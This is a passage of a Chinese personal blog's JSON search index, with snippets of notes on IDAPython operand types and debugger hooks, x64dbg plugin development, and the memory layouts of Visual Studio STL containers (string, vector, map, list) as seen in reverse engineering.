至于操作数,可以通过访问inst.Operands[]或者inst.OpN来访问.要获取被解码指令使用的操作数数量不应依赖Operands数组的长度,因为它总是被解析成UA_MAXOP==8（参阅ida.hpp）.因此应该使用遍历每个操作数并检查操作数的类型是否是o_void类型. 操作数的定义是ua.hpp中的op_t结构. op.flags：操作数的标志. op.dtype：操作数的长度类型.idaapi.dt_xxx常量,可以通过该常量来获取操作数的字节大小（1 == idaapi.dt_byte,2 == idaapi.dt_word等等）. op.type：操作数类型.idc.o_xxx常量. specflags1…specflags4：处理器相关标志. 以下是受支持的操作数类型(o_xxx): o_void：没有该操作数. o_reg：该操作数是寄存器(ax,al,es,ds等等). o_mem：直接寻址(数据). o_phrase：[基址+变址]寻址. o_displ：[基址+变址+偏移]寻址. o_imm：立即数. o_far：直接远地址(far address,代码). o_near：直接近地址(near address,代码). o_dispspec0...o_dispspec5：处理器相关标志. 还有一些操作数成员的含义因操作数的","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:19:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"调试 安装调试的hook使用如下api: debugger = idaapi.DBG_Hooks() debugger.hook() 现在运行调试器,hook会捕捉所有的调试事件,这样就能非常精确的控制IDA调试器.下面的函数在调试的时候非常有用: # 在指定的地点设置软件断点 idc.add_bpt( long Address ) # 返回当前设置的断点数量 idc.get_bpt_qty() # 获取寄存器的值,dbg必须处于运行状态 idc.get_reg_value(string Register) # 通过寄存器名获得寄存器值 idc.set_reg_Value(long Value, string Register) ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:20:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["IDA"],"content":"同类总结参考 https://www.52pojie.cn/forum.php?mod=viewthread\u0026tid=1117330\u0026highlight=%D7%DC%BD%E1idapython%D4%DA%C4%E6%CF%F2%D6%D0%B5%C4%D3%A6%D3%C3 总结idapython在逆向中的应用.mhtml ","date":"2021-08-26","objectID":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/:21:0","tags":["IDAPython"],"title":"IDAPython使用笔记","uri":"/posts/ida/idapython%E4%BD%BF%E7%94%A8/"},{"categories":["x64Dbg"],"content":"x64Dbg插件开发 ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:0:0","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"Windows下开发环境配置 建立一个空的Visual Studio项目,添加pluginmain.cpp. 进行如下配置 配置属性-\u003e常规:更改\"配置类型\"为动态库(.dll). 在VS工程中新建一个筛选器,将x64dbg的pluginsdk拖进去 配置属性-\u003e高级:目标文件扩展名,32位就写.dp32,64位就写.dp64 这样一个x64Dbg插件开发环境就搭建好了. ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:1:0","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"插件模板下载 LuoX64DbgPlugin.7z ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:1:1","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"相关函数介绍 //插件初始化函数,设置插件名称 PLUG_EXPORT bool pluginit(PLUG_INITSTRUCT* initStruct); //设置插件菜单,图标,注册回调函数 PLUG_EXPORT void plugsetup(PLUG_SETUPSTRUCT* setupStruct); //菜单点击后的响应 PLUG_EXPORT void CBMENUENTRY(CBTYPE cbType, PLUG_CB_MENUENTRY* info); //回调函数的注册 PLUG_IMPEXP void _plugin_registercallback(int pluginHandle, CBTYPE cbType, CBPLUGIN cbPlugin); ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:2:0","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"插件SDK中关心的接口 ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:3:0","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"x64Dbg中的命令 有时候插件提供的API不能满足我们的需要,我们通常会用到插件的命令. BRIDGE_IMPEXP bool DbgCmdExec(const char* cmd); //调用示例 DbgCmdExec(\"StepOver\"); ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:4:0","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"命令查询网址 https://help.x64dbg.com/en/latest/commands/breakpoint-control/index.html# ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:4:1","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"相关插件源码下载 ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:5:0","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"字符串比较 cndsteroids.7z ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:5:1","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"内存窗口和反汇编窗口选择 xSelectBlock.7z ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:5:2","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["x64Dbg"],"content":"花指令去除 LuoClearJunkCode.7z ","date":"2021-08-23","objectID":"/posts/x64dbg/x64dbg/:5:3","tags":["x64Dbg"],"title":"x64Dbg插件开发","uri":"/posts/x64dbg/x64dbg/"},{"categories":["Win相关"],"content":"这里以VS2017 Release版本为示例: ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:0:0","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"String(大小0x18) struct string { Union _Bxty { char _Buf[16]; char* _Ptr; } size_t _Mysize; //字符串长度 size_t _Myres; //最大字符串长度 }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:1:0","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"Vector(大小0xC) struct vector { T* _Myfirst; //数组起始地址 T* _Mylast; T* _Myend; }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:2:0","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"Map(大小0x8) struct map { Tree_nod* _MyHead; unsigned int _Mysize; }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:3:0","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"Tree_nod(大小0x10 + 键值对) struct __declspec(align(4)) Tree_nod { Tree_nod* _Left; Tree_nod* _Parent; Tree_nod* _Right; char _Color; char _Isnil; map_pair _Myval; //键值对 }; ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:0","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"List(大小0x8) struct list { List_node* _MyHead; unsigned int _Mysize; } ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:5:0","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Win相关"],"content":"List_node(大小0x8 + 值): struct __declspec(align(4)) List_node { List_node* _Next; List_node* _Prev; int _Myval; //值 } list-\u003eMyHead-\u003eNext为list.front(); list-\u003eMyHead-\u003ePrev为list.back(); ","date":"2020-10-10","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/:5:1","tags":["STL"],"title":"STL库学习","uri":"/posts/windows%E7%9B%B8%E5%85%B3/stl%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":null,"content":"以下文章,与君共勉之! https://mp.weixin.qq.com/s/cXV1-YSqngXp332qopEZSw 网络安全技术人员如何避开内卷.mhtml ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"作者信息","uri":"/about/"}]